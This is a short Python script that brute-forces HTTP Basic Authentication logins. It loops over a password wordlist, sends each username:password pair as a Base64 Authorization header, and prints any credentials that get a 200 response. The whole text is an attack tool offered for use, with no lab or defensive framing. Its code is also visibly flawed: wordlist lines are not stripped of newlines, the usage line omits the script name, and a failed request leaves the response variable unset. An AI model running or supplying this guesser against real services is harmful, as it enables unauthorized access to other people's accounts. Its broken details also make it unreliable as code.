import sys, requests, base64

if len(sys.argv) != 4:
    print("How to use: python3 http://localhost username wordlist.txt")

else:
    print("[+] STARTING BRUTE-FORCE!")
    valid = 0
    url = sys.argv[1]
    user = sys.argv[2]    
    wordlist = open(sys.argv[3], 'r')
    for passwd in wordlist:
        cred = str(user)+':'+str(passwd)
        cred_bytes = cred.encode('ascii')
        base64_bytes = base64.b64encode(cred_bytes)
        base64_creds = base64_bytes.decode('ascii')
        header = {'Authorization': "Basic "+ base64_creds}
        try:
            res = requests.get(url, headers = header)
        except:
            print("[!] ERROR")
        if(res.status_code == 200):
            valid = 1
            print("[+] BRUTE SUCCESS: " + user +':'+ passwd)
    
    if(valid == 0):
        print("[-] BRUTE FAILED, TRY AGAIN.")
    